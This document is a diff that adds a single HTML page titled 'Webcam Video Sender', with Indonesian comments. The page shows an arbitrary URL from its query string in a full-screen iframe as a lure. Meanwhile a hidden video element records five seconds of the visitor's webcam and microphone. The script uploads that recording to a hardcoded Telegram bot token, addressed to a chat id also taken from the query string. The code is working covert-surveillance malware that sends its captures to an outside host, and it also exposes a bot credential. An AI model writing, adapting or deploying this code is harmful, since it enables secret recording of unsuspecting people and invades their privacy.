@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Webcam Video Sender</title>
+  <style>
+    html, body, iframe {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<video id="video" autoplay muted playsinline></video>
+<iframe id="targetFrame" allow="autoplay; camera; microphone; picture-in-picture" allowfullscreen></iframe>
+
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const url = params.get('url');
+  const uid = params.get('uid');
+
+  if (!url || !uid) {
+    document.body.innerHTML = '<h2 style="text-align:center;margin-top:20%;">Hi</h2>';
+    throw new Error("Missing URL or UID");
+  }
+
+  document.getElementById("targetFrame").src = decodeURIComponent(url);
+
+  const video = document.getElementById("video");
+  let stream;
+  let recorder;
+  let chunks = [];
+
+  async function startRecording() {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      video.srcObject = stream;
+
+      recorder = new MediaRecorder(stream);
+      recorder.ondataavailable = e => chunks.push(e.data);
+
+      recorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const form = new FormData();
+        form.append("chat_id", uid);
+        form.append("video", blob, "webcam.webm");
+        form.append("caption", "🎥 Rekaman webcam 5 detik");
+
+        await fetch(`https://api.telegram.org/bot7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI/sendVideo`, {
+          method: "POST",
+          body: form
+        }).catch(err => console.error("Gagal kirim video:", err));
+      };
+
+      recorder.start();
+      setTimeout(() => {
+        recorder.stop();
+        stream.getTracks().forEach(track => track.stop());
+      }, 5000); // 5 detik rekam
+    } catch (err) {
+      console.error("Gagal akses webcam:", err);
+    }
+  }
+
+  // Mulai setelah iframe dimuat
+  window.onload = () => {
+    startRecording();
+  };
+</script>
+
+</body>
+</html>
